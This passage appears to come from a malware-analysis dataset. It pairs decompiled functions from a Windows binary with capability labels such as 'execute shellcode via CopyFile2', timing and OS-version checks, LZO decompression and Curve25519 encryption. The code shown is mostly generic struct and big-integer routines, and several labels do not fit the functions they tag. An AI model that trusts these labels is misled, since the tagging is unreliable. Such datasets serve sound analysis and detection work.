0;\n    fcn.1400a5a00(piVar1);\n    *piVar9 = iVar3;\n    pauVar13 = *0x140110290;\n    piVar9[8] = iVar14;\n    *(piVar9 + 9) = 0xffffffff;\n    fcn.1400b3860(*pauVar13 + 8);\n    *pauVar13 = auVar16;\n    *pauVar13[0xe] = 0;\n    *(pauVar13[0xe] + 8) = 0;\n    pauVar13[0xf] = 0x0;\n    pauVar13[0x10] = 0x0;\n    fcn.1400b48e0(*pauVar13 + 8, piVar10);\n    piVar10 = *0x140110260;\n    piVar1 = *0x140110260 + 2;\n    fcn.1400b3860(piVar1);\n    *(piVar10 + 0x1e) = 0;\n    iVar2 = *0x1401103f0;\n    piVar10[0x1d] = 0;\n    piVar10[1] = 0;\n    *piVar10 = iVar2 + 0x18;\n    piVar10[2] = iVar2 + 0x40;\n    *(piVar10 + 0x1f) = 0x0;\n    *(piVar10 + 0x21) = 0x0;\n    fcn.1400b48e0(piVar1, piVar8);\n    pauVar11 = *0x140110270;\n    puVar5 = **0x140110270;\n    fcn.1400b3860(puVar5 + 8);\n    *(pauVar11[0xe] + 8) = 0;\n    *pauVar11[0xe] = 0;\n    pauVar11[0xf] = 0x0;\n    pauVar11[0x10] = 0x0;\n    *pauVar11 = auVar16;\n    fcn.1400b48e0(puVar5 + 8, piVar9);\n    pauVar12 = *0x140110280;\n    puVar5 = **0x140110280;\n    fcn.1400b3860(puVar5 + 8);\n    *(pauVar12[0xe] + 8) = 0;\n    *pauVar12[0xe] = 0;\n    pauVar12[0xf] = 0x0;\n    pauVar12[0x10] = 0x0;\n    *pauVar12 = auVar16;\n    fcn.1400b48e0(puVar5 + 8, piVar9);\n    piVar10[0x1d] = pauVar13;\n    *pauVar11[0xe] = pauVar13;\n    *pauVar11[2] = *pauVar11[2] | 0x2000;\n    iVar14 = (*pcVar6)(1);\n    iVar2 = *0x140110560;\n    piVar10 = *0x14010fd20;\n    piVar1 = *0x14010fd20 + 7;\n    (*0x14010fd20)[1] = 0;\n    iVar2 = iVar2 + 0x10;\n    piVar10[2] = 0;\n    *piVar10 = iVar2;\n    piVar10[3] = 0;\n    piVar10[4] = 0;\n    piVar10[5] = 0;\n    piVar10[6] = 0;\n    fcn.1400a5a00(piVar1);\n    iVar3 = *0x140110300;\n    *(piVar10 + 9) = 0xffff;\n    iVar3 = iVar3 + 0x10;\n    piVar10[8] = iVar14;\n    *piVar10 = iVar3;\n    iVar14 = (*pcVar6)(0);\n    piVar8 = *0x14010fd00;\n    piVar1 = *0x14010fd00 + 7;\n    **0x14010fd00 = iVar2;\n    piVar8[1] = 0;\n    piVar8[2] = 0;\n    piVar8[3] = 0;\n    piVar8[4] = 0;\n    piVar8[5] = 0;\n    piVar8[6] = 0;\n    fcn.1400a5a00(piVar1);\n    *piVar8 = iVar3;\n    *(piVar8 + 9) = 0xffff;\n    piVar8[8] = iVar14;\n    iVar14 = (*pcVar6)(2);\n    piVar9 = *0x14010fd10;\n    piVar1 = *0x14010fd10 + 7;\n    **0x14010fd10 = iVar2;\n    piVar9[1] = 0;\n    piVar9[2] = 0;\n    piVar9[3] = 0;\n    piVar9[4] = 0;\n    piVar9[5] = 0;\n    piVar9[6] = 0;\n    fcn.1400a5a00(piVar1);\n    piVar9[8] = iVar14;\n    pauVar13 = *0x1401102d0;\n    *piVar9 = iVar3;\n    *(piVar9 + 9) = 0xffff;\n    fcn.1400b3860(*pauVar13 + 8);\n    *pauVar13[0xe] = 0;\n    *(pauVar13[0xe] + 8) = 0;\n    pauVar13[0xe][10] = 0;\n    pauVar13[0xf] = 0x0;\n    pauVar13[0x10] = 0x0;\n    *pauVar13 = auVar15;\n    fcn.1400b52b0(*pauVar13 + 8, piVar10);\n    piVar10 = *0x1401102a0;\n    piVar1 = *0x1401102a0 + 2;\n    fcn.1400b3860(piVar1);\n    iVar2 = *0x1401104f0;\n    *(piVar10 + 0x1e) = 0;\n    piVar10[0x1d] = 0;\n    *(piVar10 + 0xf2) = 0;\n    *piVar10 = iVar2 + 0x18;\n    piVar10[2] = iVar2 + 0x40;\n    piVar10[1] = 0;\n    *(piVar10 + 0x1f) = 0x0;\n    *(piVar10 + 0x21) = 0x0;\n    fcn.1400b52b0(piVar1, piVar8);\n    pauVar11 = *0x1401102b0;\n    puVar5 = **0x1401102b0;\n    fcn.1400b3860(puVar5 + 8);\n    *(pauVar11[0xe] + 8) = 0;\n    *pauVar11[0xe] = 0;\n    pauVar11[0xe][10] = 0;\n    pauVar11[0xf] = 0x0;\n    pauVar11[0x10] = 0x0;\n    *pauVar11 = auVar15;\n    fcn.1400b52b0(puVar5 + 8, piVar9);\n    pauVar12 = *0x1401102c0;\n    puVar5 = **0x1401102c0;\n    fcn.1400b3860(puVar5 + 8);\n    *(pauVar12[0xe] + 8) = 0;\n    *pauVar12[0xe] = 0;\n    pauVar12[0xe][10] = 0;\n    pauVar12[0xf] = 0x0;\n    pauVar12[0x10] = 0x0;\n    *pauVar12 = auVar15;\n    fcn.1400b52b0(puVar5 + 8, piVar9);\n    piVar7 = *0x14010fc90;\n    *pauVar11[2] = *pauVar11[2] | 0x2000;\n    piVar10[0x1d] = pauVar13;\n    iVar4 = *piVar7;\n    *pauVar11[0xe] = pauVar13;\n    if (iVar4 == 0) {\n        **0x140110170 = **0x140110170 + 1;\n    }\n    else {\n        LOCK();\n        **0x140110170 = **0x140110170 + 1;\n    }\n    return;\n}\n",
        "token_count": 2741
    },
    "1400b342": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400b3420(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint uStack48;\n    uchar auStack32 [8];\n    \n    uVar2 = *(arg1 + 8);\n    iVar6 = arg1 + 0x40;\n    iVar5 = arg2 + 0x40;\n    *(arg1 + 8) = *(arg2 + 8);\n    *(arg2 + 8) = uVar2;\n    uVar2 = *(arg1 + 0x10);\n    *(arg1 + 0x10) = *(arg2 + 0x10);\n    *(arg2 + 0x10) = uVar2;\n    uVar1 = *(arg1 + 0x18);\n    *(arg1 + 0x18) = *(arg2 + 0x18);\n    *(arg2 + 0x18) = uVar1;\n    uVar1 = *(arg1 + 0x1c);\n    *(arg1 + 0x1c) = *(arg2 + 0x1c);\n    *(arg2 + 0x1c) = uVar1;\n    uVar1 = *(arg1 + 0x20);\n    *(arg1 + 0x20) = *(arg2 + 0x20);\n    *(arg2 + 0x20) = uVar1;\n    uVar2 = *(arg1 + 0x28);\n    *(arg1 + 0x28) = *(arg2 + 0x28);\n    iVar7 = *(arg2 + 200);\n    *(arg2 + 0x28) = uVar2;\n    iVar3 = *(arg1 + 200);\n    if (iVar3 == iVar6) {\n        if (iVar7 == iVar5) {\n            iVar6 = 0x40;\n            do {\n                uVar2 = *(arg1 + iVar6);\n                uVar4 = *(arg1 + 8 + iVar6);\n                *(arg1 + iVar6) = *(arg2 + iVar6);\n                *(arg1 + 8 + iVar6) = *(arg2 + 8 + iVar6);\n                *(arg2 + iVar6) = uVar2;\n                uStack48 = uVar4;\n                *(arg2 + 8 + iVar6) = uStack48;\n                iVar6 = iVar6 + 0x10;\n            } while (iVar6 != 0xc0);\n            goto code_r0x0001400b352d;\n        }\n        if (iVar3 != iVar6) goto code_r0x0001400b3500;\ncode_r0x0001400b34ad:\n        iVar7 = arg1;\n        iVar8 = arg2;\n        if (iVar3 == iVar6) {\n            iVar7 = arg2;\n            iVar8 = arg1;\n            iVar6 = iVar5;\n        }\n        iVar5 = 0x40;\n        do {\n            *(iVar7 + iVar5) = *(iVar8 + iVar5);\n            *(iVar7 + 8 + iVar5) = *(iVar8 + 8 + iVar5);\n            iVar5 = iVar5 + 0x10;\n        } while (iVar5 != 0xc0);\n        *(iVar8 + 200) = *(iVar7 + 200);\n        *(iVar7 + 200) = iVar6;\n    }\n    else {\ncode_r0x0001400b3500:\n        if (iVar7 == iVar5) goto code_r0x0001400b34ad;\n        *(arg1 + 200) = iVar7;\n        *(arg2 + 200) = iVar3;\n    }\n    uVar1 = *(arg1 + 0xc0);\n    *(arg1 + 0xc0) = *(arg2 + 0xc0);\n    *(arg2 + 0xc0) = uVar1;\ncode_r0x0001400b352d:\n    fcn.1400a59d0(auStack32, arg1 + 0xd0);\n    fcn.1400a5b40(arg1 + 0xd0, arg2 + 0xd0);\n    fcn.1400a5b40(arg2 + 0xd0, auStack32);\n    fcn.1400a5ae0(auStack32);\n    return;\n}\n",
        "token_count": 995
    },
    "1400b386": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1400b3860(char **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t **hSemaphore;\n    ulong *arg1_00;\n    int32_t **ppiVar4;\n    char **ppcVar5;\n    char **ppcVar6;\n    int32_t **ppiVar7;\n    int32_t *piVar8;\n    \n    *arg1 = \"@9\\v@\\x01\";\n    arg1[3] = NULL;\n    *(arg1 + 4) = 0;\n    *(arg1 + 7) = 0;\n    *(arg1 + 1) = 0x0;\n    *(arg1 + 5) = 0x0;\n    ppcVar5 = arg1 + 8;\n    do {\n        *ppcVar5 = NULL;\n        ppcVar6 = ppcVar5 + 2;\n        *(ppcVar5 + 1) = 0;\n        ppcVar5 = ppcVar6;\n    } while (ppcVar6 != arg1 + 0x18);\n    arg1[0x19] = arg1 + 8;\n    ppiVar7 = arg1 + 0x1a;\n    *(arg1 + 0x18) = 8;\n    *ppiVar7 = NULL;\n    fcn.1400a29d0(0);\n    ppiVar2 = *0x14010ff90;\n    ppiVar4 = *0x14010ff50;\n    piVar1 = **0x14010ff90;\n    *ppiVar7 = piVar1;\n    if (piVar1 == *ppiVar4) {\n        return;\n    }\n    hSemaphore = fcn.14001fee0();\n    piVar1 = *0x14010fc90;\n    ppiVar4 = hSemaphore;\n    if (**0x14010fc90 != 0) goto code_r0x0001400a5aa0;\n    piVar8 = *ppiVar2;\n    do {\n        *piVar8 = *piVar8 + 1;\n        while( true ) {\n            iVar3 = *piVar1;\n            *ppiVar7 = piVar8;\n            if (iVar3 == 0) {\n                return;\n            }\n            iVar3 = fcn.1400149e0(hSemaphore);\n            if (iVar3 == 0) {\n                return;\n            }\n            arg1_00 = fcn.1400bc7f0(8);\n            *arg1_00 = 0x140116340;\n            ppiVar4 = fcn.1400bcdb0(arg1_00, 0x140111900, 0x140021a60);\ncode_r0x0001400a5aa0:\n            iVar3 = fcn.140014970(ppiVar4);\n            if (iVar3 != 0) {\n                fcn.140021dc0();\n                fcn.140014f30(ppiVar4);\n                piVar1 = *ppiVar4;\n                if (piVar1 != *0x140108760) {\n                    if (**0x14010fc90 == 0) {\n                        iVar3 = *piVar1;\n                        *piVar1 = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        fcn.1400a5480(piVar1);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (*_sym.imp.msvcrt.dll_free)(piVar1);\n                        return;\n                    }\n                }\n                return;\n            }\n            piVar8 = *ppiVar2;\n            if (*piVar1 == 0) break;\n            LOCK();\n            *piVar8 = *piVar8 + 1;\n            piVar8 = *ppiVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 904
    },
    "140015ff": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint64_t fcn.140015ff0(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    \n    uVar4 = arg2 + 0x1f >> 5;\n    if (*(arg1 + 8) < uVar4) {\n        fcn.14001cfa0(arg1);\n        arg1 = fcn.14001ceb0(uVar4);\n    }\n    uVar6 = arg1 + 0x18;\n    iVar2 = arg2 >> 5;\n    if ((arg2 & 0x1f) == 0) {\n        *(arg1 + 0x14) = iVar2;\n        uVar1 = uVar6 + iVar2 * 4;\n        if (uVar6 < uVar1) {\n            iVar5 = ((uVar1 - arg1) - 0x19 & 0xfffffffffffffffc) + 4;\n            if (uVar1 < arg1 + 0x19U) {\n                iVar5 = 4;\n            }\n            sub.msvcrt.dll_memset(uVar6, 0xff, iVar5);\n        }\n        return arg1;\n    }\n    *(arg1 + 0x14) = iVar2 + 1;\n    uVar1 = uVar6 + (iVar2 + 1) * 4;\n    if (uVar6 < uVar1) {\n        iVar5 = ((uVar1 - arg1) - 0x19 & 0xfffffffffffffffc) + 4;\n        if (uVar1 < arg1 + 0x19U) {\n            iVar5 = 4;\n        }\n        iVar3 = sub.msvcrt.dll_memset(uVar6, 0xff, iVar5);\n        uVar6 = iVar3 + iVar5;\n    }\n    *(uVar6 - 4) = *(uVar6 - 4) >> (0x20U - (arg2 & 0x1f) & 0x1f);\n    return arg1;\n}\n",
        "token_count": 478
    },
    "14001c7b": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.14001c7b0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int8_t iVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    \n    iVar7 = *(arg1 + 0x14);\n    if (arg2 >> 5 < *(arg1 + 0x14)) {\n        puVar1 = arg1 + 0x18;\n        iVar8 = arg2 >> 5;\n        puVar2 = puVar1 + iVar7;\n        puVar6 = puVar1 + iVar8;\n        if ((arg2 & 0x1f) == 0) {\n            puVar9 = puVar1;\n            if (puVar2 <= puVar6) goto code_r0x00014001c7c6;\n            do {\n                puVar10 = puVar6 + 1;\n                *puVar9 = *puVar6;\n                puVar6 = puVar10;\n                puVar9 = puVar9 + 1;\n            } while (puVar10 < puVar2);\n            puVar6 = puVar1 + (iVar7 - iVar8);\n        }\n        else {\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            iVar4 = arg2 & 0x1f;\n            uVar11 = uVar3 >> iVar4;\n            puVar9 = puVar1;\n            if (puVar6 < puVar2) {\n                do {\n                    puVar10 = puVar6 + 1;\n                    *puVar9 = *puVar6 << (0x20U - iVar4 & 0x1f) | uVar11;\n                    uVar3 = *puVar6;\n                    uVar11 = uVar3 >> iVar4;\n                    puVar9 = puVar9 + 1;\n                    puVar6 = puVar10;\n                } while (puVar10 < puVar2);\n                puVar6 = arg1 + 0x14 + (iVar7 - iVar8) * 4;\n                *puVar6 = uVar11;\n                if (uVar3 >> iVar4 == 0) goto code_r0x00014001c875;\n            }\n            else {\n                *(arg1 + 0x18) = uVar11;\n                puVar6 = puVar1;\n                if (uVar3 >> iVar4 == 0) goto code_r0x00014001c7c6;\n            }\n            puVar6 = puVar6 + 1;\n        }\ncode_r0x00014001c875:\n        iVar5 = puVar6 - puVar1 >> 2;\n        *(arg1 + 0x14) = iVar5;\n        if (iVar5 != 0) {\n            return;\n        }\n    }\n    else {\ncode_r0x00014001c7c6:\n        *(arg1 + 0x14) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 724
    },
    "14001d47": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint64_t fcn.14001d470(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t arg1_00;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    \n    arg1_00 = *(arg1 + 8);\n    uVar11 = arg2 >> 5;\n    iVar10 = *(arg1 + 0x14) + uVar11;\n    iVar16 = iVar10 + 1;\n    iVar7 = *(arg1 + 0xc);\n    if (*(arg1 + 0xc) < iVar16) {\n        do {\n            iVar5 = iVar7 * 2;\n            arg1_00 = arg1_00 + 1;\n            iVar4 = iVar7 * -2;\n            iVar7 = iVar5;\n        } while (iVar16 != iVar5 && SBORROW4(iVar16, iVar5) == iVar16 + iVar4 < 0);\n    }\n    iVar8 = fcn.14001ceb0(arg1_00);\n    if (iVar8 == 0) {\n        return 0;\n    }\n    puVar1 = iVar8 + 0x18;\n    puVar14 = puVar1;\n    if (0 < uVar11) {\n        puVar14 = puVar1 + uVar11;\n        sub.msvcrt.dll_memset(puVar1, 0, uVar11 * 4);\n    }\n    puVar13 = arg1 + 0x18;\n    puVar1 = puVar13 + *(arg1 + 0x14);\n    uVar6 = arg2 & 0x1f;\n    if ((arg2 & 0x1f) == 0) {\n        do {\n            puVar12 = puVar14 + 1;\n            puVar15 = puVar13 + 1;\n            *puVar14 = *puVar13;\n            if (puVar1 <= puVar15) break;\n            puVar14 = puVar14 + 2;\n            puVar13 = puVar13 + 2;\n            *puVar12 = *puVar15;\n        } while (puVar13 < puVar1);\n    }\n    else {\n        uVar11 = 0;\n        puVar15 = puVar14;\n        do {\n            puVar12 = puVar13 + 1;\n            *puVar15 = *puVar13 << uVar6 | uVar11;\n            uVar2 = *puVar13;\n            uVar3 = 0x20 - uVar6 & 0x1f;\n            uVar11 = uVar2 >> uVar3;\n            puVar13 = puVar12;\n            puVar15 = puVar15 + 1;\n        } while (puVar12 < puVar1);\n        iVar9 = (puVar1 + (-0x19 - arg1) & 0xfffffffffffffffcU) + 4;\n        if (puVar1 < arg1 + 0x19U) {\n            iVar9 = 4;\n        }\n        *(puVar14 + iVar9) = uVar11;\n        if (uVar2 >> uVar3 != 0) goto code_r0x00014001d552;\n    }\n    iVar16 = iVar10;\ncode_r0x00014001d552:\n    *(iVar8 + 0x14) = iVar16;\n    fcn.14001cfa0(arg1);\n    return iVar8;\n}\n",
        "token_count": 854
    },
    "14001dc4": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint fcn.14001dc40(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int8_t iVar5;\n    int32_t iVar6;\n    \n    puVar1 = arg1 + 0x18;\n    iVar3 = *(arg1 + 0x14);\n    iVar6 = arg2 >> 5;\n    if (iVar3 < iVar6) {\n        puVar4 = puVar1 + iVar3;\n    }\n    else {\n        puVar4 = puVar1 + iVar6;\n        if (((iVar6 < iVar3) && ((arg2 & 0x1f) != 0)) && (iVar5 = arg2 & 0x1f,  *puVar4 != (*puVar4 >> iVar5) << iVar5))\n        {\n            return 1;\n        }\n    }\n    do {\n        if (puVar4 <= puVar1) {\n            return 0;\n        }\n        puVar2 = puVar4 + -1;\n        puVar4 = puVar4 + -1;\n    } while (*puVar2 == 0);\n    return 1;\n}\n",
        "token_count": 274
    },
    "140017d1": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.140017d10(int64_t arg1, int64_t arg2)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t arg1_00;\n    ushort *puVar6;\n    int64_t iVar7;\n    ushort *puVar8;\n    ushort *puVar9;\n    uint32_t uVar10;\n    int64_t iVar11;\n    uint32_t *puVar12;\n    \n    iVar7 = arg2;\n    if (*(arg2 + 0x14) <= *(arg1 + 0x14)) {\n        iVar7 = arg1;\n        arg1 = arg2;\n    }\n    uVar10 = 0;\n    arg1_00 = fcn.14001ceb0(*(iVar7 + 8));\n    iVar2 = *(iVar7 + 0x14);\n    iVar11 = 0x18;\n    puVar6 = arg1_00 + 0x18;\n    *(arg1_00 + 0x14) = iVar2;\n    iVar3 = *(arg1 + 0x14);\n    puVar1 = puVar6 + iVar3 * 2;\n    puVar8 = puVar6;\n    do {\n        uVar4 = *(iVar7 + iVar11);\n        uVar5 = *(arg1 + iVar11);\n        puVar9 = puVar8 + 2;\n        iVar11 = iVar11 + 4;\n        uVar10 = (uVar4 & 0xffff) + (uVar5 & 0xffff) + uVar10;\n        *puVar8 = uVar10;\n        uVar10 = (uVar4 >> 0x10) + (uVar5 >> 0x10) + (uVar10 >> 0x10);\n        puVar8[1] = uVar10;\n        uVar10 = uVar10 >> 0x10;\n        puVar8 = puVar9;\n    } while (puVar9 < puVar1);\n    iVar11 = (puVar1 + (-0x19 - arg1_00) & 0xfffffffffffffffcU) + 4;\n    if (puVar1 < arg1_00 + 0x19U) {\n        iVar11 = 4;\n    }\n    puVar12 = iVar7 + 0x18 + iVar11;\n    for (puVar6 = iVar11 + puVar6; puVar6 < puVar1 + (iVar2 - iVar3) * 2; puVar6 = puVar6 + 2) {\n        uVar4 = *puVar12;\n        puVar12 = puVar12 + 1;\n        uVar10 = (uVar4 & 0xffff) + uVar10;\n        *puVar6 = uVar10;\n        uVar10 = (uVar10 >> 0x10) + (uVar4 >> 0x10);\n        puVar6[1] = uVar10;\n        uVar10 = uVar10 >> 0x10;\n    }\n    iVar7 = arg1_00;\n    if (uVar10 != 0) {\n        if (iVar2 == *(arg1_00 + 0xc)) {\n            iVar7 = fcn.14001ceb0(*(arg1_00 + 8) + 1);\n            sub.msvcrt.dll_memcpy(iVar7 + 0x10, arg1_00 + 0x10, *(arg1_00 + 0x14) * 4 + 8);\n            fcn.14001cfa0(arg1_00);\n            iVar2 = *(iVar7 + 0x14);\n        }\n        *(iVar7 + 0x14) = iVar2 + 1;\n        *(iVar7 + 0x18 + iVar2 * 4) = 1;\n    }\n    return iVar7;\n}\n",
        "token_count": 862
    },
    "14001d19": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.14001d190(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint32_t *puVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint64_t uVar14;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    \n    iVar12 = *(arg1 + 0x14);\n    iVar3 = *(arg2 + 0x14);\n    iVar16 = arg1;\n    iVar5 = iVar12;\n    if (iVar3 <= iVar12) {\n        iVar16 = arg2;\n        arg2 = arg1;\n        iVar5 = iVar3;\n        iVar3 = iVar12;\n    }\n    uVar9 = *(arg2 + 8);\n    iVar12 = iVar3 + iVar5;\n    if (*(arg2 + 0xc) < iVar12) {\n        uVar9 = uVar9 + 1;\n    }\n    iVar6 = fcn.14001ceb0(uVar9);\n    if (iVar6 != 0) {\n        puVar7 = iVar6 + 0x18;\n        puVar13 = puVar7 + iVar12;\n        if (puVar7 < puVar13) {\n            puVar7 = sub.msvcrt.dll_memset(puVar7, 0);\n        }\n        puVar15 = iVar16 + 0x18;\n        puVar1 = puVar15 + iVar5;\n        puVar2 = arg2 + 0x18 + iVar3;\n        if (puVar15 < puVar1) {\n            iVar16 = (puVar2 + (-0x19 - arg2) & 0xfffffffffffffffcU) + 4;\n            if (puVar2 < arg2 + 0x19) {\n                iVar16 = 4;\n            }\n            do {\n                while( true ) {\n                    uVar9 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    if (uVar9 == 0) break;\n                    uVar14 = 0;\n                    puVar10 = puVar7;\n                    puVar11 = arg2 + 0x18;\n                    do {\n                        uVar4 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        uVar8 = uVar4 * uVar9 + *puVar10 + uVar14;\n                        *puVar10 = uVar8;\n                        uVar14 = uVar8 >> 0x20;\n                        puVar10 = puVar10 + 1;\n                    } while (puVar11 < puVar2);\n                    *(puVar7 + iVar16) = uVar8 >> 0x20;\n                    puVar7 = puVar7 + 1;\n                    if (puVar1 <= puVar15) goto code_r0x00014001d2b3;\n                }\n                puVar7 = puVar7 + 1;\n            } while (puVar15 < puVar1);\n        }\ncode_r0x00014001d2b3:\n        if (0 < iVar12) {\n            do {\n                puVar7 = puVar13 + -1;\n                puVar13 = puVar13 + -1;\n                if (*puVar7 != 0) break;\n                iVar12 = iVar12 + -1;\n            } while (iVar12 != 0);\n        }\n        *(iVar6 + 0x14) = iVar12;\n    }\n    return iVar6;\n}\n",
        "token_count": 832
    },
    "14001dbd": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid fcn.14001dbd0(uint *arg1, ulong arg2, int64_t arg3)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    puVar4 = arg3 + 0x18;\n    puVar1 = arg1 + ((arg2 + -1 >> 5) + 1);\n    puVar2 = puVar4 + *(arg3 + 0x14);\n    puVar5 = arg1;\n    if (puVar4 < puVar2) {\n        do {\n            puVar3 = puVar4 + 1;\n            *puVar5 = *puVar4;\n            puVar4 = puVar3;\n            puVar5 = puVar5 + 1;\n        } while (puVar3 < puVar2);\n        arg1 = arg1 + (puVar2 + (-0x19 - arg3) & 0xfffffffffffffffcU) + 4;\n    }\n    if (puVar1 <= arg1) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014001e570. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memset)(arg1, 0, (puVar1 + (-1 - arg1) & 0xfffffffffffffffcU) + 4);\n    return;\n}\n",
        "token_count": 324
    },
    "14001f34": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint8_t * fcn.14001f340(int64_t arg1, uint8_t *arg2, ulong *arg3)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint64_t uVar6;\n    \n    uVar3 = 0;\n    if (arg1 != 0) {\n        uVar3 = fcn.140014c70(arg1);\n    }\n    *arg3 = uVar3;\n    uVar4 = *arg2;\n    arg2 = arg2 + 1;\n    if (uVar4 == 0xff) {\n        arg3[1] = uVar3;\n    }\n    else {\n        uVar3 = fcn.14001f540(uVar4, arg1);\n        arg2 = fcn.14001f5f0(uVar4, uVar3, arg2, arg3 + 1);\n    }\n    uVar4 = *arg2;\n    arg2 = arg2 + 1;\n    puVar5 = NULL;\n    *(arg3 + 5) = uVar4;\n    if (uVar4 != 0xff) {\n        uVar4 = 0;\n        do {\n            uVar1 = *arg2;\n            arg2 = arg2 + 1;\n            uVar2 = uVar4 & 0x3f;\n            uVar4 = uVar4 + 7;\n            puVar5 = puVar5 | (uVar1 & 0x7f) << uVar2;\n        } while (uVar1 < '\\0');\n        puVar5 = puVar5 + arg2;\n    }\n    arg3[3] = puVar5;\n    puVar5 = arg2 + 1;\n    uVar6 = 0;\n    uVar4 = 0;\n    *(arg3 + 0x29) = *arg2;\n    do {\n        uVar1 = *puVar5;\n        puVar5 = puVar5 + 1;\n        uVar2 = uVar4 & 0x3f;\n        uVar4 = uVar4 + 7;\n        uVar6 = uVar6 | (uVar1 & 0x7f) << uVar2;\n    } while (uVar1 < '\\0');\n    arg3[4] = puVar5 + uVar6;\n    return puVar5;\n}\n",
        "token_count": 551
    },
    "14001d58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.14001d580(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar1 = *(arg2 + 0x14);\n    uVar4 = *(arg1 + 0x14) - iVar1;\n    if (uVar4 == 0) {\n        puVar2 = arg1 + 0x18 + iVar1;\n        puVar3 = arg2 + 0x18 + iVar1 * 4;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar3 = puVar3 + -1;\n            if (*puVar2 != *puVar3) {\n                return -(*puVar2 < *puVar3) | 1;\n            }\n        } while (arg1 + 0x18 < puVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 219
    },
    "14001d7b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
